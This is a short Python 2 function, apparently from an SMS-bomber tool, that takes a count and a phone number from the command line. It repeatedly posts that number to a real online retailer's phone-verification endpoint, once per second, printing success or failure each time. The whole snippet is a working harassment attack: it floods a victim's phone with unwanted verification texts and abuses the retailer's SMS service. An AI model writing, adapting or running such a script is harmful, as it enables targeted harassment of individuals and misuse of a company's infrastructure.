```python
def spam():
	jumlah=sys.argv[1].split("=")[1:]
	jumlah=jumlah[0]
	jumlah=int(jumlah)
	phone=sys.argv[2]
	print __banner__
	param = {'phone':''+sys.argv[2],'smsType':'1'}
	count = 0
	while (count < jumlah):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
		if '"success":true' in r.text:
			print("\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
		else:
			print("\033[1;31m[FAILED] Send Failed...Sleep for 1 second...\033[0m")
		time.sleep(1)
		count = count + 1
	print("\033[1;33m[ DONE ] Stopped...\033[0m")
	sys.exit(1)
```